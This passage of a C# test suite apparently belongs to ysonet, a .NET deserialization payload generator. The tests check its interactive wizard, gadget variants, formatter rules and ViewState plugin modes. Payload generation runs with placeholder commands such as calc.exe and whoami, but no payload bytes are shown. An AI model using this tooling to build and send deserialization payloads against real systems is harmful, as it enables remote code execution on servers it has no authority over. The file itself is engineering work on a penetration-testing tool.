            // then Generate. Compare to the core-generated bytes.
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top menu -> gadget payload (index 0)
            keys.Type("ObjectDataProvider").Enter(); // module picker: filter + pick
            keys.Type("formatter").Enter();          // form: open the formatter setting
            keys.Digit(2);                           // choice menu -> Json.NET (index 1)
            keys.Type("Generate").Enter();           // form: run Generate
            keys.Escape();                           // leave the settings form
            keys.Escape();                           // leave the module list
            keys.Escape();                           // top menu -> quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] expected = GenerateOdpJson("calc.exe");

            AssertTrue(got.Length > 0, "wizard wrote a payload to stdout stream");
            AssertTrue(BytesEqual(got, expected), "wizard payload equals core payload");
            AssertTrue(stderr.Contains("ysonet.exe -g ObjectDataProvider -f Json.NET -c calc.exe"),
                "equivalent command echoed to stderr");
            AssertTrue(!Encoding.UTF8.GetString(got).Contains("Equivalent command"),
                "prompts did not leak into the payload stream");
        }

        private static void MenuNavigation()
        {
            var keys = new ScriptedKeyReader();
            keys.Down().Down().Enter();   // 0 -> 1 -> 2, select index 2
            Menu m = new Menu(keys);
            int i = WithSwallowedError(() => m.Show("pick", new List<string> { "a", "b", "c" }, 0));
            AssertEqual(2, i, "arrows moved to index 2");
        }

        private static void MenuDigitAndCancel()
        {
            Menu m1 = new Menu(new ScriptedKeyReader().Digit(2));
            int i = WithSwallowedError(() => m1.Show("pick", new List<string> { "a", "b", "c" }, 0));
            AssertEqual(1, i, "digit 2 selects index 1");

            Menu m2 = new Menu(new ScriptedKeyReader().Escape());
            int c = WithSwallowedError(() => m2.Show("pick", new List<string> { "a", "b" }, 0));
            AssertEqual(-1, c, "escape cancels with -1");
        }

        private static void PickerShowSelectAndCancel()
        {
            var keys = new ScriptedKeyReader().Type("Beta").Enter();
            Picker p = new Picker(keys);
            string sel = WithSwallowedError(() =>
                p.Show("pick", new List<string> { "Alpha", "Beta", "Gamma" }, null));
            AssertEqual("Beta", sel, "typed filter then Enter selects");

            Picker p2 = new Picker(new ScriptedKeyReader().Escape());
            string cancelled = WithSwallowedError(() =>
                p2.Show("pick", new List<string> { "Alpha", "Beta" }, null));
            AssertTrue(cancelled == null, "escape cancels to null");
        }

        private static void MenuRedrawsInPlace()
        {
            // Only meaningful with a real console cursor. Under a redirected stderr
            // (this test harness, CI) the widget appends by design, so there is
            // nothing to measure - treat as a pass. In a real terminal this asserts
            // that N navigation keys do NOT print N copies of the menu (the bug we
            // fixed: absolute-row caching that broke when the buffer scrolled).
            if (!ysonet.Interactive.ConsoleCursor.CanControl())
                return;

            var items = new List<string> { "a", "b", "c", "d", "e" };
            int before = Console.CursorTop;
            var keys = new ScriptedKeyReader().Down().Down().Down().Enter();
            new Menu(keys).Show("pick", items, 0);
            int after = Console.CursorTop;

            // In-place redraw advances the cursor by about one menu block
            // (title + items), not by block-height per keystroke.
            int advanced = after - before;
            AssertTrue(advanced <= items.Count + 3,
                "cursor advanced by ~one block, not once per keypress (advanced=" + advanced + ")");
        }

        private static void MenuShowsNumbersAndHint()
        {
            var keys = new ScriptedKeyReader().Enter();
            var err = new StringWriter();
            TextWriter saved = Console.Error;
            Console.SetError(err);
            try { new Menu(keys).Show("pick", new List<string> { "Alpha", "Beta", "Gamma" }, 0); }
            finally { Console.SetError(saved); }

            string s = err.ToString();
            AssertTrue(s.Contains("1.") && s.Contains("Alpha"), "menu items are numbered");
            AssertTrue(s.Contains("Esc to go back"), "menu shows the key hint");
        }

        private static void WizardAdvancedOptions()
        {
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("minify").Enter();             // open the minify flag
            keys.Digit(1);                           // on (index 0)
            keys.Type("Generate").Enter();
            keys.Escape();                           // leave form
            keys.Escape();                           // leave module list
            keys.Escape();                           // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] expected = GenerateOdpJson("calc.exe", true);

            AssertTrue(got.Length > 0, "payload produced");
            AssertTrue(BytesEqual(got, expected), "minified wizard payload equals minified core payload");
            AssertTrue(stderr.Contains("--minify"), "echoed command shows --minify");
        }

        private static void WizardOutputToFile()
        {
            string file = Path.Combine(Path.GetTempPath(), "ysonet_wizard_test_out.bin");
            if (File.Exists(file)) File.Delete(file);

            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("outputpath").Enter();         // open output path
            keys.TypeLine(file);                     // set the file
            keys.Type("Generate").Enter();
            keys.Escape();                           // leave form
            keys.Escape();                           // leave module list
            keys.Escape();                           // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "nothing written to the stdout stream");
            AssertTrue(File.Exists(file), "file was written");
            byte[] fileBytes = File.ReadAllBytes(file);
            AssertTrue(BytesEqual(fileBytes, GenerateOdpJson("calc.exe", false)), "file bytes equal core payload");
            File.Delete(file);
        }

        private static void WizardCancelAtPicker()
        {
            var keys = new ScriptedKeyReader();
            keys.Enter();     // top -> gadget
            keys.Escape();    // cancel the module list -> back to top
            keys.Escape();    // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);
            AssertEqual(0, stdout.Length, "cancelling emits no payload");
        }

        private static void WizardEscAtTextPrompt()
        {
            // Open a text setting, press Esc: the edit cancels back to the settings
            // form (not stuck at the prompt), and nothing is generated.
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("command").Enter();            // open the command text setting
            keys.Escape();                           // Esc at the prompt -> back to the form
            keys.Escape();                           // leave the form -> module list
            keys.Escape();                           // leave the module list -> top
            keys.Escape();                           // top menu -> quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);
            AssertEqual(0, stdout.Length, "Esc at a text prompt emits no payload");
        }

        private static void WizardPluginPath()
        {
            var keys = new ScriptedKeyReader();
            keys.Digit(2);                          // top -> plugin (index 1)
            keys.Type("ApplicationTrust").Enter();  // module picker
            keys.Type("command").Enter();           // open the command setting
            keys.TypeLine("calc.exe");              // set it
            keys.Type("Generate").Enter();
            keys.Escape();                          // leave form
            keys.Escape();                          // leave module list
            keys.Escape();                          // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);

            // The editor mirrors the plugin's own default (usesimpletype on), so the
            // core comparison passes the same flag. It does not change the payload
            // here (no minify), but keeps the two argv builds equivalent.
            RunResult core = PayloadRunner.RunPlugin("ApplicationTrust",
                new string[] { "-p", "ApplicationTrust", "--command", "calc.exe", "--usesimpletype" });
            AssertTrue(core.Success, "core plugin ran");
            int len;
            byte[] expected = PayloadRunner.Encode(core.Raw, "raw", out len);

            AssertTrue(got.Length > 0, "plugin payload produced");
            AssertTrue(BytesEqual(got, expected), "wizard plugin payload equals core payload");
            AssertTrue(stderr.Contains("-p ApplicationTrust"), "echoed plugin command");
        }

        private static void CommandInputTypes()
        {
            // Each gadget declares what -c means; the wizard relies on this.
            AssertEqual(CommandInputType.ShellCommand, Gadget("ObjectDataProvider").CommandInput(), "ODP is a shell command");
            AssertEqual(CommandInputType.Ignored, Gadget("ActivitySurrogateSelector").CommandInput(), "ASS ignores the command");
            AssertEqual(CommandInputType.Ignored, Gadget("ActivitySurrogateDisableTypeCheck").CommandInput(), "ASDTC ignores the command");
            AssertEqual(CommandInputType.CsSourceFile, Gadget("ActivitySurrogateSelectorFromFile").CommandInput(), "ASSFromFile takes a .cs file");
            AssertEqual(CommandInputType.CsSourceFile, Gadget("XamlAssemblyLoadFromFile").CommandInput(), "XamlAssemblyLoadFromFile takes a .cs file");
            AssertEqual(CommandInputType.DllPath, Gadget("BaseActivationFactory").CommandInput(), "BaseActivationFactory takes a DLL path");
            AssertEqual(CommandInputType.DllPath, Gadget("GetterCompilerResults").CommandInput(), "GetterCompilerResults takes a DLL path");
            AssertEqual(CommandInputType.Url, Gadget("ObjRef").CommandInput(), "ObjRef takes a URL");
            AssertEqual(CommandInputType.FilePath, Gadget("XamlImageInfo").CommandInput(), "XamlImageInfo takes a file path");

            // Prompt labels follow the type.
            AssertEqual("Command to run", Wizard.CommandLabel(CommandInputType.ShellCommand), "shell label");
            AssertEqual("Path to .dll", Wizard.CommandLabel(CommandInputType.DllPath), "dll label");
            AssertEqual("URL", Wizard.CommandLabel(CommandInputType.Url), "url label");
            AssertEqual("calc.exe", Wizard.CommandDefault(CommandInputType.ShellCommand), "shell default");
            AssertEqual("", Wizard.CommandDefault(CommandInputType.DllPath), "dll has no default");
        }

        private static void IgnoredCommandGadget()
        {
            // ActivitySurrogateDisableTypeCheck ignores -c (it just flips a protection
            // flag). It must generate with no command, and both the CLI and the
            // interactive editor must treat the command as unneeded.
            const string name = "ActivitySurrogateDisableTypeCheck";
            AssertEqual(CommandInputType.Ignored, Gadget(name).CommandInput(), "gadget ignores the command");

            // Interactive: the command and rawcmd fields are hidden, command not required.
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest(name);
            EditableField cmd = FindEditable(fields, "command");
            EditableField rawcmd = FindEditable(fields, "rawcmd");
            AssertTrue(cmd != null && cmd.Hidden && !cmd.Required, "command field hidden and optional");
            AssertTrue(rawcmd != null && rawcmd.Hidden, "rawcmd field hidden");

            // The equivalent command line omits -c when there is no command.
            var tokens = CommandEcho.GadgetTokens(name, "LosFormatter", "",
                false, false, "", "", "", false, false, false, false, null);
            AssertTrue(!tokens.Contains("-c"), "no -c token for an ignored command");

            // Core generation succeeds with an empty command.
            InputArgs ia = new InputArgs();
            ia.Cmd = "";
            GenerationRequest req = new GenerationRequest();
            req.GadgetName = name;
            req.FormatterName = "LosFormatter";
            req.OutputFormat = "";
            req.InputArgs = ia;
            RunResult r = PayloadRunner.GenerateGadget(req);
            AssertTrue(r.Success, "generates with no command: " + r.ErrorMessage);
            AssertTrue(r.Raw != null, "produced a payload");
        }

        private static IGenerator Gadget(string name)
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
            if (g == null)
                throw new Exception("gadget not found: " + name);
            return g;
        }

        private static void GadgetsDeclareVariants()
        {
            AssertEqual(4, Gadget("ObjectDataProvider").Variants().Count, "ODP declares 4 variants");
            AssertEqual(2, Gadget("XamlImageInfo").Variants().Count, "XamlImageInfo declares 2 variants");
            AssertEqual(2, Gadget("ActivitySurrogateSelector").Variants().Count, "ASS declares 2 variants");
            AssertEqual(2, Gadget("ActivitySurrogateSelectorFromFile").Variants().Count, "ASSFromFile inherits 2 variants");
            AssertEqual(2, Gadget("ResourceSet").Variants().Count, "ResourceSet (ig option) declares 2 variants");
            AssertEqual(0, Gadget("TypeConfuseDelegate").Variants().Count, "TypeConfuseDelegate has no variants");

            var v = Gadget("ObjectDataProvider").Variants();
            AssertEqual(1, v[0].Number, "first variant is number 1");
            AssertTrue(!string.IsNullOrEmpty(v[0].Label), "variants carry a label");
        }

        private static void VariantInputTypes()
        {
            // XamlImageInfo is the reference case: its variants take different -c
            // inputs, so each variant declares its own. Variant 1 reads a file,
            // variant 2 runs a command.
            var xii = Gadget("XamlImageInfo");
            var vs = xii.Variants();
            AssertEqual(CommandInputType.FilePath, vs[0].EffectiveInput(xii.CommandInput()), "XamlImageInfo v1 = file path");
            AssertEqual(CommandInputType.ShellCommand, vs[1].EffectiveInput(xii.CommandInput()), "XamlImageInfo v2 = shell command");

            // A variant with no declared input falls back to the gadget default.
            var odp = Gadget("ObjectDataProvider");
            var ov = odp.Variants();
            AssertEqual(odp.CommandInput(), ov[0].EffectiveInput(odp.CommandInput()), "ODP variant inherits the gadget input");
            AssertTrue(!ov[0].Input.HasValue, "ODP variant declares no per-variant input");
        }

        private static void VariantFormatterOptOutDataModel()
        {
            // The per-variant opt-out data model: a variant can NARROW the gadget's
            // formatters, and the check is first-token and case-insensitive, matching
            // IsSupported / the wizard's FormatterTokens.
            var narrowed = new GadgetVariant(1, "x").Without("SoapFormatter");
            AssertTrue(!narrowed.SupportsFormatter("SoapFormatter"), "an opted-out formatter is not supported");
            AssertTrue(narrowed.SupportsFormatter("BinaryFormatter"), "a different formatter is still supported");
            // Robust token match: a listed value carrying a suffix still matches the opt-out.
            AssertTrue(!narrowed.SupportsFormatter("SoapFormatter (2)"), "opt-out matches on the first token, not the whole string");
            AssertTrue(!new GadgetVariant(1, "x").Without("SoapFormatter").SupportsFormatter("soapformatter"), "opt-out is case-insensitive");

            // A variant with no opt-out supports every formatter (the default, empty list).
            var open = new GadgetVariant(2, "y");
            AssertEqual(0, open.UnsupportedFormatters.Count, "the opt-out list defaults to empty");
            AssertTrue(open.SupportsFormatter("SoapFormatter"), "no opt-out means every formatter is supported");
            AssertTrue(open.SupportsFormatter("BinaryFormatter"), "no opt-out means every formatter is supported (2)");
        }

        private static void VariantFormatterOptOutWiring()
        {
            // The two affected gadgets: variant 1 (TypeConfuseDelegate, a generic
            // SortedSet) opts out of SoapFormatter; variant 2 (TextFormattingRunProperties)
            // does not. The gadget-level union still advertises SoapFormatter.
            foreach (string name in new string[] { "ActivitySurrogateDisableTypeCheck", "XamlAssemblyLoadFromFile" })
            {
                var vs = Gadget(name).Variants();
                AssertEqual(2, vs.Count, name + " declares 2 variants");
                AssertTrue(vs[0].UnsupportedFormatters.Contains("SoapFormatter"), name + " variant 1 declares the SoapFormatter opt-out");
                AssertTrue(!vs[0].SupportsFormatter("SoapFormatter"), name + " variant 1 does not support SoapFormatter");
                AssertTrue(vs[0].SupportsFormatter("BinaryFormatter"), name + " variant 1 still supports BinaryFormatter");
                AssertEqual(0, vs[1].UnsupportedFormatters.Count, name + " variant 2 has no opt-out");
                AssertTrue(vs[1].SupportsFormatter("SoapFormatter"), name + " variant 2 supports SoapFormatter");
                AssertTrue(Gadget(name).IsSupported("SoapFormatter"), name + " still lists SoapFormatter at the gadget level (union)");
            }
        }

        private static void EditorBlocksVariantFormatterMismatch()
        {
            // The editor validates a variant+formatter mismatch at generate: variant 1 of
            // ActivitySurrogateDisableTypeCheck cannot produce SoapFormatter, so the editor
            // blocks with a precise line naming the setting, the formatter, and the variant.
            var ed = new ModuleEditor(null, null, true, null, null);
            var fields = ed.BuildFieldsForTest("ActivitySurrogateDisableTypeCheck");

            // Default variant is 1; pick the opted-out formatter.
            FindEditable(fields, "formatter").Value = "SoapFormatter";
            string p = ed.MissingVariantFormatterProblemForTest();
            AssertTrue(p != null, "variant 1 + SoapFormatter is reported as a problem");
            AssertTrue(p.Contains("formatter") && p.Contains("SoapFormatter") && p.Contains("variant 1"),
                "the problem names the setting, the formatter, and the variant: " + p);

            // A supported formatter on the same variant is fine.
            FindEditable(fields, "formatter").Value = "BinaryFormatter";
            AssertTrue(ed.MissingVariantFormatterProblemForTest() == null, "variant 1 + BinaryFormatter is fine");

            // Switching to variant 2 (TextFormattingRunProperties) makes Soap fine again.
            FindEditable(fields, "formatter").Value = "SoapFormatter";
            string v2label = Gadget("ActivitySurrogateDisableTypeCheck").Variants()[1].Label;
            FindEditable(fields, "variant").Value = v2label;
            AssertTrue(ed.MissingVariantFormatterProblemForTest() == null, "variant 2 + SoapFormatter is fine");
        }

        private static void GuardBlocksVariantFormatterOnNonUiPath()
        {
            // The non-UI guard (GuardVariantFormatter in Generate) turns the impossible
            // variant 1 + SoapFormatter pair into a clean RunResult.Fail carrying the
            // guard message, not the raw framework "Generic Types" string. This drives
            // the same PayloadRunner.GenerateGadget path the CLI uses.
            // ActivitySurrogateDisableTypeCheck ignores -c (no file compile), so it is fast.
            RunResult v1soap = GenerateWithVariant("ActivitySurrogateDisableTypeCheck", "SoapFormatter", 1);
            AssertTrue(!v1soap.Success, "variant 1 + SoapFormatter fails");
            AssertTrue((v1soap.ErrorMessage ?? "").IndexOf("is not supported by variant 1", StringComparison.OrdinalIgnoreCase) >= 0,
                "the guard fired, not the raw framework error: " + v1soap.ErrorMessage);

            // An unaffected formatter on the same variant still generates.
            RunResult v1bin = GenerateWithVariant("ActivitySurrogateDisableTypeCheck", "BinaryFormatter", 1);
            AssertTrue(v1bin.Success, "variant 1 + BinaryFormatter still generates: " + v1bin.ErrorMessage);

            // Variant 2 (TextFormattingRunProperties) is not generic, so Soap works.
            RunResult v2soap = GenerateWithVariant("ActivitySurrogateDisableTypeCheck", "SoapFormatter", 2);
            AssertTrue(v2soap.Success, "variant 2 + SoapFormatter generates: " + v2soap.ErrorMessage);
        }

        // Drive PayloadRunner.GenerateGadget for one gadget/formatter/variant with a
        // never-executed placeholder command (Test=false), the same as a matrix cell.
        private static RunResult GenerateWithVariant(string gadget, string formatter, int variant)
        {
            InputArgs ia = CalcInput();
            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = gadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            };
            return PayloadRunner.GenerateGadget(req);
        }

        private static void OptionHeuristics()
        {
            // Choices pulled from an enumerating description.
            var alg = EditableField.ParseChoices("The encryption algorithm can be set to DES, 3DES, or AES. Default: AES.");
            AssertTrue(alg != null && alg.Count == 3, "three algorithms parsed");
            AssertEqual("DES", alg[0], "first choice");
            AssertEqual("AES", alg[2], "last choice");

            // Single-quoted tokens (delivery modes) become choices.
            var modes = EditableField.ParseChoices("'winforms' (default) or 'wpfxaml': two delivery modes");
            AssertTrue(modes != null && modes.Contains("winforms") && modes.Contains("wpfxaml"), "quoted modes parsed");

            // A default token is recovered.
            AssertEqual("AES", EditableField.ParseDefault("... can be DES, 3DES, or AES. Default: AES."), "default AES");
            AssertEqual("winforms", EditableField.ParseDefault("delivery mode. Default: winforms"), "default winforms");
            AssertEqual("", EditableField.ParseDefault("no default mentioned here"), "no default -> empty");

            // Required inference: value option with no default/ignored/optional.
            AssertTrue(EditableField.LooksRequired("The validationKey from machineKey.", true), "no-default value option looks required");
            AssertTrue(!EditableField.LooksRequired("Gadget chain. Default: ActivitySurrogateSelector.", true), "with-default is not required");
            AssertTrue(!EditableField.LooksRequired("A flag.", false), "flags are never required");
            AssertTrue(!EditableField.LooksRequired("Validate and decrypt the viewstate if it has been encrypted.", true), "conditional (if) is not required");
        }

        private static void EditorPluginFields()
        {
            // The editor turns a plugin's OptionSet into editable fields, recovering
            // defaults and choices, and offers a gadget picker for the gadget option.
            var editor = new ModuleEditor(null, null, false, null, null);
            var fields = editor.BuildFieldsForTest("ViewState");

            EditableField gadget = FindEditable(fields, "gadget");
            AssertTrue(gadget != null && gadget.Kind == FieldKind.Pick, "gadget option is a picker");
            AssertTrue(gadget.Choices != null && gadget.Choices.Contains("TypeConfuseDelegate"), "gadget picker lists gadgets");
            AssertEqual("ActivitySurrogateSelector", gadget.Value, "gadget defaults to ActivitySurrogateSelector");

            EditableField valg = FindEditable(fields, "validationalg");
            AssertTrue(valg != null && valg.Kind == FieldKind.Choice, "validationalg is a choice");
            AssertTrue(valg.Choices.Contains("HMACSHA256"), "validationalg choices parsed from help");
            AssertTrue(valg.AllowCustom, "a choice still allows a custom value");

            EditableField vkey = FindEditable(fields, "validationkey");
            AssertTrue(vkey != null && vkey.Required, "validationkey is flagged required");

            // Output controls and a Generate action are always present.
            AssertTrue(FindEditable(fields, "output") != null, "output format field present");
            bool hasGenerate = false;
            foreach (EditableField f in fields)
                if (f.IsAction) hasGenerate = true;
            AssertTrue(hasGenerate, "a Generate action row is present");
        }

        private static EditableField FindEditable(List<EditableField> fields, string label)
        {
            foreach (EditableField f in fields)
                if (string.Equals(f.Label, label, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static EditableField FindAction(List<EditableField> fields, string actionId)
        {
            foreach (EditableField f in fields)
                if (f.IsAction && string.Equals(f.ActionId, actionId, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static void EditorActionsAndOwnership()
        {
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("ObjectDataProvider");

            // Generate, copy-to-clipboard, and show-command actions are all offered.
            AssertTrue(FindAction(fields, "generate") != null, "generate action present");
            AssertTrue(FindAction(fields, "clipboard") != null, "copy-to-clipboard action present");
            AssertTrue(FindAction(fields, "showcmd") != null, "show-command action present");

            // Built-ins are not module-own; the gadget's own options (e.g. variant) are.
            AssertTrue(!FindEditable(fields, "formatter").ModuleOwn, "formatter is a shared built-in");
            AssertTrue(!FindEditable(fields, "output").ModuleOwn, "output is a shared built-in");
            EditableField variant = FindEditable(fields, "variant");
            AssertTrue(variant != null && variant.ModuleOwn, "variant is a gadget-specific option");
        }

        private static void ChoiceDetection()
        {
            // Colon-introduced list, keeping a dotted token intact (System.String).
            var fmt = EditableField.ParseChoices("The object format: Csv, PenData, System.String, WaveAudio. Default: PenData");
            AssertTrue(fmt != null && fmt.Count == 4, "colon list of four tokens");
            AssertTrue(fmt.Contains("System.String"), "dotted token kept whole");

            // Numbered options -> the numbers.
            var num = EditableField.ParseChoices("XAML variant: 1 = bare, 2 = wrapper. Default: 2");
            AssertTrue(num != null && num.Count == 2 && num[0] == "1" && num[1] == "2", "numbered choices 1,2");

            // Quoted lowercase modes, ignoring a quoted CamelCase format name.
            var mode = EditableField.ParseChoices("mode. 'winforms' (default) under the 'Xaml' format, or 'wpfxaml'. Default: winforms");
            AssertTrue(mode != null && mode.Count == 2, "two lowercase modes");
            AssertTrue(mode.Contains("winforms") && mode.Contains("wpfxaml") && !mode.Contains("Xaml"), "CamelCase 'Xaml' excluded");

            // And the real Clipboard plugin options come through as selects. Clipboard
            // declares modes, so 'mode' is the mode picker (two delivery modes) and the
            // inner xamlvariant is a choice shown in the wpfxaml mode.
            var editor = new ModuleEditor(null, null, false, null, null);
            var fields = editor.BuildFieldsForTest("Clipboard");
            EditableField modeField = FindEditable(fields, "mode");
            AssertTrue(modeField != null && modeField.Kind == FieldKind.Choice, "Clipboard mode is a choice");
            AssertTrue(modeField.Choices.Count == 2, "two delivery modes offered");
            EditableField xv = FindEditable(fields, "xamlvariant");
            AssertTrue(xv != null && xv.Kind == FieldKind.Choice, "xamlvariant is a choice");
        }

        private static void BridgedChainChoices()
        {
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("ObjectDataProvider");
            EditableField bgc = FindEditable(fields, "bridgedgadgetchain");
            AssertTrue(bgc != null && bgc.Kind == FieldKind.Choice, "bridged chain is a choice");
            AssertTrue(bgc.AllowCustom, "still allows a custom comma-separated chain");
            AssertTrue(bgc.Choices != null && bgc.Choices.Count > 0, "offers bridge-capable gadgets");
        }

        private static void VariantSwitchResetsCommand()
        {
            // XamlImageInfo v1 reads a file path, v2 runs a shell command. A command
            // typed under the shell variant must NOT survive a switch to the file
            // variant (where it would silently be used as a file path).
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("XamlImageInfo");
            EditableField variant = FindEditable(fields, "variant");
            EditableField command = FindEditable(fields, "command");
            AssertTrue(variant != null && command != null, "variant and command fields present");
            // The variant field is bound to its labels, in variant order (v1, v2).
            AssertTrue(variant.Choices != null && variant.Choices.Count == 2, "two variant labels");
            string v1Label = variant.Choices[0]; // v1 = file path
            string v2Label = variant.Choices[1]; // v2 = shell command

            // Select the shell-command variant and set a command.
            variant.Value = v2Label;
            editor.RefreshDynamicForTest();
            command.Value = "whoami";
            editor.RefreshDynamicForTest(); // stable type: the value is kept
            AssertEqual("whoami", editor.CommandValueForTest, "command kept while type is unchanged");

            // Switch to the file-path variant: the stale shell command is cleared.
            variant.Value = v1Label;
            editor.RefreshDynamicForTest();
            AssertEqual("", editor.CommandValueForTest, "command reset when the input type changes");
        }

        private static void OptionsPersistAndReset()
        {
            // One session shared across module loads (this is what the real editor
            // uses to carry values between modules).
            var session = new WizardSession();
            var editor = new ModuleEditor(null, null, false, null, session);

            // Change a shared setting (outputpath) in one plugin, as an edit would.
            var vs = editor.BuildFieldsForTest("ViewState");
            EditableField op = FindEditable(vs, "outputpath");
            AssertTrue(op != null, "outputpath present");
            op.Value = "out.bin"; op.Touched = true;

            // Open a different plugin: the same setting pre-fills from memory.
            var dnn = editor.BuildFieldsForTest("DotNetNuke");
            AssertEqual("out.bin", FindEditable(dnn, "outputpath").Value,
                "a changed setting persists to another module that has it");

            // Reset restores this module's defaults (outputpath default is empty).
            editor.ResetToDefaultsForTest();
            AssertEqual("", FindEditable(editor.CurrentFieldsForTest, "outputpath").Value,
                "reset returns settings to their defaults");

            // Reset also drops the remembered value, so it no longer propagates.
            var vs2 = editor.BuildFieldsForTest("ViewState");
            AssertEqual("", FindEditable(vs2, "outputpath").Value,
                "reset cleared the remembered value too");

            // An untouched default must NOT propagate (no clobbering other defaults).
            var session2 = new WizardSession();
            var editor2 = new ModuleEditor(null, null, false, null, session2);
            editor2.BuildFieldsForTest("ViewState");                 // nothing touched
            var dnn2 = editor2.BuildFieldsForTest("DotNetNuke");
            AssertEqual("", FindEditable(dnn2, "outputpath").Value,
                "untouched defaults do not leak into other modules");
        }

        private static void CommandPersistsAcrossGadgets()
        {
            // Type a command in one gadget and switch to another WITHOUT generating:
            // the new gadget must show the typed command, not the old default. (The
            // bug: the command was only saved at generate time.)
            var session = new WizardSession();
            var editor = new ModuleEditor(null, null, true, null, session);

            var g1 = editor.BuildFieldsForTest("TypeConfuseDelegate");
            EditableField cmd = FindEditable(g1, "command");
            AssertTrue(cmd != null, "command field present");
            cmd.Value = "mspaint"; cmd.Touched = true;

            // Switching modules snapshots the current one, then seeds the next.
            var g2 = editor.BuildFieldsForTest("ClaimsIdentity");
            AssertEqual("mspaint", FindEditable(g2, "command").Value,
                "the typed command carried to another gadget without generating");

            // And back again shows the same, not the stale default.
            var g3 = editor.BuildFieldsForTest("TypeConfuseDelegate");
            AssertEqual("mspaint", FindEditable(g3, "command").Value,
                "the typed command is still there when returning to the first gadget");
        }

        private static void SettingsSharedGadgetToPlugin()
        {
            // Two separate editors (gadget + plugin) that share one session, exactly
            // like the real wizard. A setting changed in the gadget carries to a
            // plugin that has the same-named setting.
            var session = new WizardSession();

            var gEditor = new ModuleEditor(null, null, true, null, session);
            var g = gEditor.BuildFieldsForTest("TypeConfuseDelegate");
            EditableField gop = FindEditable(g, "outputpath");
            gop.Value = "shared.bin"; gop.Touched = true;
            gEditor.SnapshotToMemoryForTest(); // simulates leaving the gadget editor

            var pEditor = new ModuleEditor(null, null, false, null, session);
            var p = pEditor.BuildFieldsForTest("ViewState");
            AssertEqual("shared.bin", FindEditable(p, "outputpath").Value,
                "a setting changed in a gadget carries to a plugin with the same setting");
        }

        private static void ViewStateModeErrorIsActionable()
        {
            // Only a validationkey, no payload source: generation must fail with a
            // message that names what to set (not the old vague "mode" text), and it
            // must NOT kill the process.
            RunResult r = PayloadRunner.RunPlugin("ViewState",
                new string[] { "-p", "ViewState", "--validationkey=70DBADBFF4B7A13BE67DD0B11B177936" });
            AssertTrue(!r.Success, "fails without a payload source");
            string m = (r.ErrorMessage ?? "").ToLowerInvariant();
            AssertTrue(m.Contains("command") && m.Contains("dryrun") && m.Contains("unsignedpayload"),
                "the error names the payload-source options: " + r.ErrorMessage);

            // 'examples' must throw (caught) rather than exiting the process.
            RunResult ex = PayloadRunner.RunPlugin("ViewState",
                new string[] { "-p", "ViewState", "--examples" });
            AssertTrue(!ex.Success, "examples does not generate a payload");
            AssertTrue((ex.ErrorMessage ?? "").ToLowerInvariant().Contains("examples"),
                "examples reports a clear message instead of exiting: " + ex.ErrorMessage);
        }

        private static void ExamplesHiddenFromEditor()
        {
            var vs = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ViewState");
            AssertTrue(FindEditable(vs, "examples") == null,
                "the informational 'examples' toggle is not shown in the settings editor");
            // Real payload options are still present.
            AssertTrue(FindEditable(vs, "validationkey") != null, "validationkey still shown");
            AssertTrue(FindEditable(vs, "mode") != null, "the mode picker is shown");
        }

        private static void PluginModesDriveOptions()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var vs = editor.BuildFieldsForTest("ViewState");

            EditableField mode = FindEditable(vs, "mode");
            AssertTrue(mode != null && mode.Kind == FieldKind.Choice, "a mode picker is shown");
            AssertTrue(mode.Choices != null && mode.Choices.Count == 3, "three modes offered");

            // Default mode = Exploit: command + validationkey required, gadget shown,
            // the defining 'dryrun' flag hidden (implied by the mode).
            EditableField command = FindEditable(vs, "command");
            EditableField vkey = FindEditable(vs, "validationkey");
            AssertTrue(command.Required, "exploit: command is required");
            AssertTrue(vkey.Required, "exploit: validationkey is required");
            AssertTrue(!FindEditable(vs, "gadget").Hidden, "exploit: gadget is shown");
            // dryrun is the mode-defining flag: driven by the picker, not shown as a field.
            AssertTrue(FindEditable(vs, "dryrun") == null, "exploit: dryrun is not a separate field (mode-driven)");
            AssertTrue(FindEditable(vs, "unsignedpayload").Hidden, "exploit: unsignedpayload is hidden");

            command.Value = "calc.exe"; command.Touched = true;
            vkey.Value = "ABC"; vkey.Touched = true;
            string exploitArgv = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(exploitArgv.Contains("--command") && exploitArgv.Contains("--validationkey"),
                "exploit argv passes command and validationkey: " + exploitArgv);
            AssertTrue(!exploitArgv.Contains("--dryrun"), "exploit argv has no --dryrun");
            AssertTrue(!exploitArgv.Contains("--unsignedpayload"), "exploit argv has no --unsignedpayload");

            // Switch to Dry run: only validationkey required; gadget/command hidden and
            // NOT passed; the --dryrun flag is passed instead.
            mode.Value = mode.Choices[1];
            editor.RefreshDynamicForTest();
            AssertTrue(FindEditable(vs, "validationkey").Required, "dryrun: validationkey required");
